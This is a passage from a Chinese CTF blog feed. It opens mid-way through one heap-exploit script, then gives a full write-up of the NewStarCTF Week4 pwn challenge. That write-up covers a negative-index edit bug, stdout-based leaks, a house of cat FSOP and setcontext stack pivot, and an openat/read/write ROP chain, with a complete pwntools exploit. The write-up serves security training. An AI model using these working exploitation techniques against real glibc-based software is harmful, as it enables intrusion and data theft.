class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    l = <span class="hljs-built_in">len</span>(pay)<br>    pay = <span class="hljs-built_in">int</span>.from_bytes(pay, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-comment">#print(hex(libcbase))</span><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>syscall_ret = libcbase + <span class="hljs-number">0xd2625</span><br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>pop_rsi = libcbase + <span class="hljs-number">0x23a6a</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b96</span><br>pop_rax = libcbase + <span class="hljs-number">0x1b500</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x820</span><br><br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xa0</span> + p64(heap_addr + <span class="hljs-number">0x1140</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr + <span class="hljs-number">0x1000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x1350</span>)<br>edit(<span class="hljs-number">4</span>, key(payload))<br><br>shellcode = <span class="hljs-string">&#x27;int 3&#x27;</span> + shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, heap_addr, <span class="hljs-number">0x30</span>)<br>shellcode = asm(shellcode)<br>edit(<span class="hljs-number">5</span>, key(shellcode))<br><br>edit(<span class="hljs-number">3</span>, key(p64(setcontext + <span class="hljs-number">53</span>)))<br>p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>).encode())<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ctftime上关于Sandybox的wp：<a href="https://ctftime.org/writeup/20115">https://ctftime.org/writeup/20115</a></p><p>实际上ptrace函数还有其它更多的功能，具体请看：<a href="https://www.anquanke.com/post/id/231078">https://www.anquanke.com/post/id/231078</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 公开赛Week4 pwn 这是堆🐎</title>
    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF 公开赛Week4 pwn 这是堆🐎</p><p>题目环境：glibc-2.31</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到题目调用了prctl函数，说明开了沙盒保护机制。使用seccomp-tools检查一下</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>发现题目禁止了execve的系统调用，我们很容易想到要用orw将flag读取出来；但这题还把open函数给禁用了（是不是很无语），这里我们可以系统调用openat函数去打开文件，openat函数的系统调用号为257。 </p><p>​                                                                                                     </p><p>Add函数申请堆块，Dele函数和Show函数就一句简单的puts输出。</p><p>再去看看Edit函数，对v1采用int类型去定义的，没有对负数进行检查，我们就可以利用这一点去修改除堆以外的其它地方。</p><p><img src="/img/2/1667357538953.png"></p><p>进一步查看运行时全局变量heaps在bss段的数据，发现存在IO_FILE的地址，可以输入负数然后直接修改_IO_FILE当中的值。</p><img src="/img/2/1667359698418.jpg" style="zoom: 80%;" /><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>可以使用shellcode去执行orw将flag读取出来，当然前提是泄漏堆地址，然后使用mprotect函数更改堆地址的执行权限，由于程序最初并没有给确定地址的可执行段，所以需要劫持rsp寄存器先执行mprotect函数的ROP，才能进一步去调用shellcode；或者直接劫持rsp寄存器使用open、read、write函数的ROP来实现orw。这里我采用后者。</p><p>程序中的gadget肯定是不够我们去实现ROP的，我们就使用libc中的gadget。</p><p>要控制rsp才可以去ROP，libc中可以去执行setcontext中的代码控制rsp（具体见我的Dest0g3 520迎新赛 pwn ez_kiwi这篇文章）。</p><p>我们可以去修改_IO_FILE当中的值，就想办法劫持其中的控制流，来执行setcontext。</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><h5 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h5><p>这里我们就去修改标准输出<code>_IO_2_1_stdout_</code>中的值首先泄漏libc的基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>然后使用ROPgadget 找到相应的gadget，<code>syscall ret</code>这个geaget可以使用操作码去寻找（如下）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>我们还要寻找：</p><p><code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code></p><p>setcontext中劫持rsp是通过rdx来修改的，但是在puts函数的调用中我们无法去控制rdx；使用这个gadget（它是getkeyserv_handle函数其中的一段），为我们劫持控制流提供了很好的帮助。</p><h5 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h5><p>存放gadget，堆是一个很好的选择，在libc中mp结构就存放了堆地址，我们就采用相同的方式去泄漏堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h5><p>执行puts函数，会通过找到<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>中的偏移，去执行<code>_IO_file_xsputn</code>函数，我们就需要修改<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>，  让其最终执行其它函数。<code>_IO_file_jumps</code> 并不能改成任意地址，在调用过程中会对其地址进行检查。</p><p>这里我采用house of cat</p><p>让其调用<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数去执行如下代码（简写）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>劫持到_IO_wfile_jumps（如下图）</p><img src="/img/2/1667369851498.jpg" style="zoom: 67%;" /><p>_IO_switch_to_wget_mode函数中具体实现（如下图）</p><img src="/img/2/1667370258241.jpg" style="zoom: 67%;" /><p>在这过程中rdi寄存器始终是<code>_IO_2_1_stdout_</code>的地址， 让其最后执行：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<br></code></pre></td></tr></table></figure><p>通过rdi的值去控制rdx，并去执行我们指定的函数，这里我们是去执行setcontext 劫持rsp寄存器指向堆地址。</p><p>改写<code>_IO_2_1_stdout_</code>构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>写入堆中的数据要注意setcontext的执行 与orw中gadget的位置，具体构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-comment">#print(hex(heap_addr))</span><br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                                                         </p><p>关于house of cat我没有讲的太详细，大家可以参考看雪大佬的这篇文章<a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛 pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
